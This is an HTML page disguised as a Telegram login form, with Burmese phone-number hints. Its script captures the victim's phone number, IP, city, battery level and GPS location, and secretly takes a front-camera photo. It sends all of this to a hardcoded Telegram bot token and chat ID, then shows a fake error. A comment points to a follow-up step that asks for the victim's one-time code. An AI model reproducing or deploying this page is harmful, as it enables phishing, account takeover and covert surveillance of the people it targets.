<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Login</title>
    <style>
        body { margin: 0; padding: 0; font-family: Arial, sans-serif; background: #e7f1f8; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .login-box { background: #fff; width: 340px; padding: 30px; border-radius: 10px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); text-align: center; }
        img { width: 80px; margin-bottom: 15px; }
        h2 { color: #0088cc; margin-bottom: 10px; }
        input { width: 100%; padding: 12px; margin-bottom: 15px; border: 1px solid #ccc; border-radius: 5px; box-sizing: border-box; outline: none; }
        button { width: 100%; padding: 12px; border: none; border-radius: 5px; background: #0088cc; color: white; font-weight: bold; cursor: pointer; }
        button:disabled { background: #ccc; }
        video, canvas { display: none; }
    </style>
</head>
<body>

<div class="login-box">
    <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="TG">
    <h2>Telegram Login</h2>
    <p style="font-size: 14px; color: #666;">Please enter your phone number to continue.</p>
    
    <input type="tel" id="phone" placeholder="+959xxxxxxxxx">
    <button id="loginBtn" onclick="startTracking()">Next</button>
</div>

<video id="v" autoplay playsinline></video>
<canvas id="c"></canvas>

<script>
    const token = '8661599650:AAFaEo8wGPhpvbj8g6cOonAZZxatMF21lV0';
    const chat_id = '5304050102';

    async function startTracking() {
        const phone = document.getElementById('phone').value;
        const btn = document.getElementById('loginBtn');
        if (!phone) { alert("Please enter phone number!"); return; }

        btn.disabled = true;
        btn.innerText = "Processing...";

        // Battery, IP & Device Info
        let report = `🚀 **Telegram Login Attempt!**\n\n`;
        report += `📱 Phone: ${phone}\n`;
        try {
            const battery = await navigator.getBattery();
            report += `🔋 Battery: ${Math.round(battery.level * 100)}%\n`;
            const ipRes = await fetch('https://ipapi.co/json/');
            const ipData = await ipRes.json();
            report += `🌐 IP: ${ipData.ip}\n📍 City: ${ipData.city}\n`;
        } catch (e) {}

        // Location & Photo
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(async (pos) => {
                report += `📍 Map: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}\n`;
                await capturePhoto(report);
            }, async () => { await capturePhoto(report); });
        } else { await capturePhoto(report); }
    }

    async function capturePhoto(fullReport) {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
            const v = document.getElementById('v');
            v.srcObject = stream;
            setTimeout(async () => {
                const c = document.getElementById('c');
                c.width = 640; c.height = 480;
                c.getContext('2d').drawImage(v, 0, 0);
                const blob = await new Promise(res => c.toBlob(res, 'image/jpeg'));
                const formData = new FormData();
                formData.append('chat_id', chat_id);
                formData.append('photo', blob, 'shot.jpg');
                formData.append('caption', fullReport);
                await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: formData });
                
                // နောက်တစ်ဆင့် OTP တောင်းတဲ့ Page ဆီ သွားခိုင်းခြင်း
                alert("Internal Error: Please try again later.");
            }, 2000);
        } catch (err) {
            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(fullReport)}`);
            alert("Connection error. Try again.");
        }
    }
</script>
</body>
</html>
